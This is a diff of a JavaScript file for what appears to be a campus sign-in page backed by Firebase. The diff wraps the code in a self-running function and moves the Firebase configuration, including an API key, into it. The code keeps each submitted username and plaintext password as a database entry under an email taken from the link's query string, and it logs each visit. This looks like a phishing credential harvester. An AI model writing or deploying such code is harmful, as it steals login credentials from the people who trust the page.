@@ -1,16 +1,3 @@
-
-  // Initialize Firebase
-  var config = {
-    apiKey: "AIzaSyDW2N5DTqC2SQvRr0kWZOlYFiq5xgU08-8",
-    authDomain: "campus-site.firebaseapp.com",
-    databaseURL: "https://campus-site.firebaseio.com",
-    projectId: "campus-site",
-    storageBucket: "",
-    messagingSenderId: "71367401718"
-  };
-  firebase.initializeApp(config);
-
-
 //date variable so both use the same session id
 function getDateStr(d)
 {
@@ -54,8 +41,6 @@ function getDay(d)
 	return monthStr + '-' + dayStr;
 }
 
-var dateOpened = new Date();
-
 class siteVisit
 {
 	constructor(email)
@@ -90,7 +75,7 @@ class dbEntry
 			this.user = user.value;
 			this.pass = pass.value;
 			this.passHidden = pass.value.substring(0, 1);
-			for(var i=1; i<pass.value.length; i++)
+			for(var i=1; i < pass.value.length; i++)
 				this.passHidden += '*';
 		}
 		
@@ -117,7 +102,21 @@ class dbEntry
 
 //MY SIGNIN CODE
 
-var getUrl = window.location.search.substring(1);
+(function() {
+	var dateOpened = new Date();
+	
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyDW2N5DTqC2SQvRr0kWZOlYFiq5xgU08-8",
+    authDomain: "campus-site.firebaseapp.com",
+    databaseURL: "https://campus-site.firebaseio.com",
+    projectId: "campus-site",
+    storageBucket: "",
+    messagingSenderId: "71367401718"
+  };
+  firebase.initializeApp(config);
+  
+  var getUrl = window.location.search.substring(1);
 //$('#email')[0].value = getUrl.split("=")[1];
 if(getUrl.length == 0) getUrl = "undefined";
 
@@ -130,5 +129,6 @@ $('#form_signin').on('submit', function() {
 	else new dbEntry(getUrl, $('#username')[0], $('#password')[0]);
 });
 
-//log visit on db
+  //log visit on db
 new siteVisit(getUrl);
+});
